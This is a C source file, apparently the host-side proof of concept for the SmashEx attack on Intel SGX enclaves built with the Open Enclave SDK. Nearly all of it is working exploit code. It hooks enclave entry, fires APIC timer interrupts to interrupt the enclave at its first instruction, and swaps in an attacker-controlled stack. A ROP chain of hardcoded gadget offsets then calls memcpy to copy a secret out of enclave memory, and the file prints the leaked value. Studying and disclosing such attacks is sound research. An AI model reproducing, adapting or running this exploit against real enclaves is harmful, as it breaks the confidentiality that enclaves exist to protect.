// Copyright (c) Open Enclave SDK contributors.
// Licensed under the MIT License.

#include <openenclave/host.h>
#include <enclave.h>
#include <apic.h>
#include <idt.h>
#include <stdio.h>
#include <stdlib.h>
#include <sched.h>

#include "attack_u.h"

#define SMASHEX_INFO(fmt, ...) printf("[%s] SmashEx: " fmt "\n", __FILE__, ##__VA_ARGS__)

#define INTERRUPT_COUNT_LIM 100

#define SMASHEX_STACK_SIZE 4096
#define SMASHEX_ANCHOR 0xB99EB0
#define SMASHEX_ENCLAVE_BASE 0x7ffff5000000

// ROP gadget offsets
#define SMASHEX_GADGET_RBP 0x142094
#define SMASHEX_GADGET_RDX 0xbfa68
#define SMASHEX_GADGET_RDI 0x18d7f
#define SMASHEX_GADGET_RSI 0x135de
#define SMASHEX_MEMCPY 0xab550
#define SMASHEX_RIP_ENDPOINT 0x150ac9

// target secret base offset
#define SMASHEX_TARGET_BASE 0x390000

static int apic_timer_enabled;
static uint64_t attacker_stack[SMASHEX_STACK_SIZE >> 3];
static char attacker_buf[4096];

static void finish(int ret);

bool check_simulate_opt(int* argc, const char* argv[])
{
    for (int i = 0; i < *argc; i++)
    {
        if (strcmp(argv[i], "--simulate") == 0)
        {
            fprintf(stdout, "Running in simulation mode\n");
            memmove(&argv[i], &argv[i + 1], (*argc - i) * sizeof(char*));
            (*argc)--;
            return true;
        }
    }
    return false;
}


/* ECALL function numbers are in the range: [0:32765] */
#define OE_ECALL_BASE 0

/* OCALL function numbers are in the range: [32768:65535] */
#define OE_OCALL_BASE 0x8000


/* Function numbers are 16 bit integers */
typedef enum _oe_func
{
    OE_ECALL_DESTRUCTOR = OE_ECALL_BASE,
    OE_ECALL_INIT_ENCLAVE,
    OE_ECALL_CALL_ENCLAVE_FUNCTION,
    OE_ECALL_VIRTUAL_EXCEPTION_HANDLER,
    /* Caution: always add new ECALL function numbers here */
    OE_ECALL_MAX,

    OE_OCALL_CALL_HOST_FUNCTION = OE_OCALL_BASE,
    OE_OCALL_THREAD_WAKE,
    OE_OCALL_THREAD_WAIT,
    OE_OCALL_MALLOC,
    OE_OCALL_FREE,
    OE_OCALL_GET_TIME,
    /* Caution: always add new OCALL function numbers here */
    OE_OCALL_MAX, /* This value is never used */

    __OE_FUNC_MAX = OE_ENUM_MAX,
} oe_func_t;

oe_result_t oe_ecall(
    oe_enclave_t* enclave,
    uint16_t func,
    uint64_t arg_in,
    uint64_t* arg_out);

// This is the function that the enclave will call back into to
// print a message.
void host_attack()
{
    fprintf(stdout, "Enclave called into host to print: Hello World!\n");
}


uint16_t gget_code_from_call_arg1(uint64_t arg)
{
    return (uint16_t)((0xffff000000000000 & arg) >> 48);
}
uint16_t gget_func_from_call_arg1(uint64_t arg)
{
    return (uint16_t)((0x0000ffff00000000 & arg) >> 32);
}
uint16_t gget_flags_from_call_arg1(uint64_t arg)
{
    return (uint16_t)((0x00000000ffff0000 & arg) >> 16);
}
uint16_t gget_result_from_call_arg1(uint64_t arg)
{
    return (uint16_t)(0x000000000000ffff & arg);
}

static int attack_triggered, attack_done;
static uint64_t entry_addr, enclave_base;
static oe_enclave_t* enclave;


struct enter_args {
	uint64_t rsi;
	uint64_t rdi;
	uint64_t rdx;
	uint64_t rcx;
	uint64_t rbx;
	uint64_t rax;
	uint64_t rbp;
	uint64_t rsp;
};

extern uint64_t SmashEx_old_rsp;
extern uint64_t SmashEx_old_rbp;

static int interrupt_count;

void sgx_step_aep_trampoline();

void aep_callback(){
	oe_result_t result;
	uint64_t arg_out = 0;

	if(attack_done)
		++ interrupt_count;

	if(interrupt_count >= INTERRUPT_COUNT_LIM){
		SMASHEX_INFO("AEP callback reached!");

		SMASHEX_INFO("Operations finished");
		SMASHEX_INFO("Secret value: 0x%lx", *(unsigned long*)attacker_buf);

		finish(0);
	} else if(!attack_done){
		SMASHEX_INFO("AEP callback reached!");
		SMASHEX_INFO("Successfully interrupted at the first instruction");

		register_aep_cb(0);
		if(apic_timer_enabled)
			apic_timer_deadline();

		SMASHEX_INFO("Calling exception handler in enclave");
		result = oe_ecall(enclave, OE_ECALL_VIRTUAL_EXCEPTION_HANDLER, 0, &arg_out);
		SMASHEX_INFO("Return result = %d", (int)result);
		register_aep_cb(aep_callback);
	}
}

#define TIMER_INTERVAL 40
#define OENTRY 32

void enter_hook_c(struct enter_args* args){
	uint16_t code = gget_code_from_call_arg1(args->rdi);
	SMASHEX_INFO("In enter_hook arg=(%x, %x, %x, %x)", 
			code,
			gget_func_from_call_arg1(args->rdi),
			gget_flags_from_call_arg1(args->rdi),
			gget_result_from_call_arg1(args->rdi));
	if(code == 4 && !attack_triggered){ // ORET
		SMASHEX_INFO("Attack triggered! Registering AEP callback. (rbp = %p, rsp = %p)",
				(void*)args->rbp,
				(void*)args->rsp);
		register_aep_cb(aep_callback);
		args->rcx = (uint64_t)sgx_step_aep_trampoline;
		SmashEx_old_rsp = args->rsp;
		SmashEx_old_rbp = args->rbp;
		args->rsp = (uint64_t)(enclave_base + SMASHEX_ANCHOR);
		attack_triggered = 1;
		if(apic_timer_enabled)
			apic_timer_irq(TIMER_INTERVAL);
	} else if(attack_triggered){ // invoking handler
		attack_done = 1;
		SMASHEX_INFO("Delivering handler!");
		args->rsp = (uint64_t)(enclave_base + SMASHEX_GADGET_RBP); /* for rip:
															mov %rbp, %rsp
															pop %rbp
															retq
															*/
		args->rbp = (uint64_t)attacker_stack; // for rbp/rsp
		oe_register_enter_hook(0, enclave);
	}
}

__attribute__((naked)) void enter_hook(){
	asm(
		"mov %rsp, %r11	\r\n"
		"add $8, %r11 \r\n"
		"push %r11 \r\n"
		"push %rbp \r\n"
		"push %rax \r\n"
		"push %rbx \r\n"
		"push %rcx \r\n"
		"push %rdx \r\n"
		"push %rdi \r\n"
		"push %rsi \r\n"
		"mov %rsp, %rdi \r\n"
	);

	asm(
		"call enter_hook_c \r\n"
	);

	asm(
		"pop %rsi \r\n"
		"pop %rdi \r\n"
		"pop %rdx \r\n"
		"pop %rcx \r\n"
		"pop %rbx \r\n"
		"pop %rax \r\n"
		"pop %rbp \r\n"
		"pop %r11 \r\n"
		"pop %r12 \r\n"
		"mov %r11, %rsp \r\n"
		"jmp *%r12 \r\n"
	);
}

static int attacker_stack_pos;

static void attacker_stack_rev_push(uint64_t val){
	attacker_stack[attacker_stack_pos ++] = val;
}

static void attacker_stack_pos_add(int val){
	attacker_stack_pos += (val >> 3);
}

/**
 * Preparing gadgets in the attacker's external stack
 *
 * */
static void construct_attacker_stack(){
	/* Controlling the RBP */
	attacker_stack_rev_push((uint64_t)attacker_stack + 256 + 0x70); /* rbp */
	attacker_stack_rev_push(enclave_base + SMASHEX_GADGET_RDX);
	/* Set RDX  */
	attacker_stack[(256 + 0x70 - 0x60) >> 3] = 0; // rax
	attacker_stack[(256 + 0x70 - 0x48) >> 3] = 0; // rcx
	attacker_stack[(256 + 0x70 - 0x68) >> 3] = 0x8ULL << 32; // edx
	attacker_stack[(256 + 0x70 - 0x70) >> 3] = 0; // rsi
	attacker_stack_pos_add(0x80);
	attacker_stack_rev_push((uint64_t)attacker_stack + 256);
	/* Set RDI  */
	attacker_stack_rev_push(enclave_base + SMASHEX_GADGET_RDI); /* pop %rdi; pop %rbp; retq */
	attacker_stack_rev_push((uint64_t)attacker_buf); /* rdi */
	attacker_stack_rev_push((uint64_t)attacker_stack + 256);
	/* Set RSI  */
	attacker_stack_rev_push(enclave_base + SMASHEX_GADGET_RSI); /* pop %rsi; pop %rbp; retq */
	attacker_stack_rev_push(enclave_base + SMASHEX_TARGET_BASE); /* rsi: secret */
	attacker_stack_rev_push((uint64_t)attacker_stack + 256);
	/* Jump to memcpy */
	attacker_stack_rev_push(enclave_base + SMASHEX_MEMCPY); /* rip: memcpy */
	/* Loop forever */
	attacker_stack_rev_push(enclave_base + SMASHEX_RIP_ENDPOINT); /* rip: forever */
}

static void finish(int ret){
	if(apic_timer_enabled)
		apic_timer_deadline();
    // Clean up the enclave if we created one
    if (enclave)
        oe_terminate_enclave(enclave);
	exit(ret);
}

int main(int argc, const char* argv[])
{
    oe_result_t result;
    int ret = 1;

	uint32_t flags = 0;

    if (check_simulate_opt(&argc, argv))
    {
        flags |= OE_ENCLAVE_FLAG_SIMULATE;
    }

    if (argc < 2)
    {
        fprintf(
            stderr, "Usage: %s enclave_image_path [ --simulate  ]\n", argv[0]);
        goto exit;
    }

	if(argc >= 3 && argv[2][0] == 'n'){
		apic_timer_enabled = 0;
	} else{
		apic_timer_enabled = 1;
	}

    // Create the enclave
    result = oe_create_attack_enclave(
        argv[1], OE_ENCLAVE_TYPE_AUTO, flags, NULL, 0, &enclave);
    if (result != OE_OK)
    {
        fprintf(
            stderr,
            "oe_create_attack_enclave(): result=%u (%s)\n",
            result,
            oe_result_str(result));
        goto exit;
    }

    ASSERT(!claim_cpu(VICTIM_CPU));
    ASSERT(!prepare_system_for_benchmark(PSTATE_PCT));
	print_system_settings();


	oe_set_skip_exception_handler(1, enclave);
	oe_register_enter_hook(enter_hook, enclave);
	SMASHEX_INFO("TCS = %p", (void*)oe_get_tcs());
	register_enclave_info();
	print_enclave_info();

	uint64_t entry_offset = 0;
	enclave_base = oe_get_base(enclave);
	if(!enclave_base)
		enclave_base = SMASHEX_ENCLAVE_BASE;
	entry_offset = oe_get_entry(enclave);
	entry_addr = enclave_base + entry_offset;
	SMASHEX_INFO("Enclave entry = %p", (void*)entry_addr);

	construct_attacker_stack();

	if(apic_timer_enabled)
		apic_timer_oneshot(IRQ_VECTOR);

    // Call into the enclave
    result = enclave_attack(enclave);
    if (result != OE_OK)
    {
        fprintf(
            stderr,
            "calling into enclave_attack failed: result=%u (%s)\n",
            result,
            oe_result_str(result));
        goto exit;
    }


    ret = 0;

exit:
	finish(ret);

	return 0;
}
